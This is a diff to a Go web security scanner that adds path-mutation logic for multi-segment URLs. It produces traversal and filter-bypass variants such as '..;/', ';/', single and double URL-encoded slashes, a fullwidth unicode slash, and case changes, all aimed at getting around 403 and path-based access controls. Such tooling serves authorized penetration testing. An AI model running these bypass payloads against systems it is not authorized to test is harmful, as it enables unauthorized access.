@@ -355,6 +355,43 @@ func (s *Scanner) runPaths() {
 		u + "/" + p + "/../" + p, u + "/.//" + p, u + "/./" + p + "/../" + p,
 	}
 
+	// Per-segment tricks for multi-segment paths (e.g. dashboard/server)
+	segments := strings.Split(p, "/")
+	if len(segments) > 1 {
+		for i := 0; i < len(segments)-1; i++ {
+			before := strings.Join(segments[:i+1], "/")
+			after := strings.Join(segments[i+1:], "/")
+
+			// Inject traversal/bypass chars between segments
+			paths = append(paths,
+				u+"/"+before+"/./"+after,                             // dashboard/./server
+				u+"/"+before+";/"+after,                              // dashboard;/server
+				u+"/"+before+"/..;/"+after,                           // dashboard/..;/server
+				u+"/"+before+"/../"+before+"/"+after,                 // dashboard/../dashboard/server
+				u+"/"+before+"%2f"+after,                             // dashboard%2fserver
+				u+"/"+before+"%252f"+after,                           // dashboard%252fserver (double-encode)
+				u+"/"+before+"%ef%bc%8f"+after,                       // dashboard<unicode-slash>server
+				u+"/"+before+"//"+after,                              // dashboard//server
+				u+"/"+before+"/.;/"+after,                            // dashboard/.;/server
+			)
+		}
+
+		// Per-segment case variations
+		for i, seg := range segments {
+			upper := make([]string, len(segments))
+			copy(upper, segments)
+			upper[i] = strings.ToUpper(seg)
+			paths = append(paths, u+"/"+strings.Join(upper, "/"))
+
+			if len(seg) > 1 {
+				mixed := make([]string, len(segments))
+				copy(mixed, segments)
+				mixed[i] = string(seg[0]) + strings.ToUpper(string(seg[1])) + seg[2:]
+				paths = append(paths, u+"/"+strings.Join(mixed, "/"))
+			}
+		}
+	}
+
 	var wg sync.WaitGroup
 	for _, path := range paths {
 		wg.Add(1)
